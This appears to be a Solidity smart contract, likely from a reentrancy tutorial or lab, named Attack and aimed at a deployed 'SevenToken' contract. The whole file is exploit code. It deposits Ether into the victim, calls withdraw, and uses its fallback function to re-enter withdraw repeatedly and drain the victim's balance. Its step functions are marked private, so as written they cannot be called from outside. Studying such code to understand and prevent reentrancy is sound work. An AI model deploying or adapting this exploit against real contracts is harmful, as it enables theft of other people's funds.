contract Attack {
  address owner;
  address victim;
  modifier ownerOnly { require(owner == msg.sender); _; }
  function Attack() payable { owner = msg.sender; }
  // 設定已部署的  SevenToken 合約地址 
  function setVictim(address target) ownerOnly { victim = target; }
  function balanceOf() returns (uint256) {return this.balance;}
  
  // 存Ether 給 SevenToken  deposit Ether to SevenToken deployed
  function step1(uint256 amount) private ownerOnly {
      if (this.balance > amount) {
          victim.call.value(amount)(bytes4(keccak256("deposit()")));
      }
  }
  // 提 Ether 給 SevenToken withdraw Ether from SevenToken deployed
  function step2(uint256 amount) private ownerOnly {
      victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
  }
  function () payable {
      if (msg.sender == victim) {
          victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
      }
  }
}